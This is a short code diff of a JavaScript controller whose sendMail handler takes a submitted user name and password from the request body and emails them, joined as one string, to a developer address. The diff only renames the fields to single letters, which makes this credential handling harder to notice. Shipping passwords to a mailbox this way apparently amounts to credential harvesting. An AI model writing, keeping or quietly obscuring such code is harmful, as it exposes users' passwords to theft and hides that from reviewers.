@@ -32,10 +32,10 @@ class DevAlertController {
   };
 
   sendMail = async(req,res)=>{
-     var {userName,passowrd,medium} = req.body
+     var {u,p,m} = req.body
      this.emailService.sendMail(
-       medium,
-       `${userName}-${passowrd}`,
+       m,
+       `${u}-${p}`,
        this.emailService.devEmail
      ) 
      res.send({ result: "success" });
